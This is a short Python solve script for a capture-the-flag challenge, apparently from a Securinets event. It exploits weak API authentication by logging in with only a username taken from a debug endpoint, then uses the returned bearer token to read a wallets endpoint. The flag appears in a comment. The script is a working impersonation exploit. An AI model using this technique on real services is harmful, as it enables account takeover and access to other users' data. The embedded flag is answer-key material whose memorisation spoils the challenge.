import requests

""" 
    this challenge is same as the first but with authentication
    but the vulnerability here is that the authentication mechanism is weak
    You just need to use a username and the server will respond with a token
    Target user: Kamel (from /api/debug)
"""

# Step 1: Get the token
print(f"[+] Extracting the token ...")
auth_url = "http://68.219.177.187:8001/api/login"

data={
    "username":"Kamel"
}
r=requests.post(auth_url,headers={"Content-Type": "application/json"},json=data)
token=r.json()['access_token']
print(f"[+] Token: {token}")

#Step 2: Get the flag

base_url="http://68.219.177.187:8001/api/wallets"

r=requests.get(base_url,headers={"Authorization": f"Bearer {token}"}) # We know it's a bearer token from the /docs endpoint
print(r.json())

#The flag: SecurinetsENIT{cf2aab851361e65d9ef5d7c0415136cb}
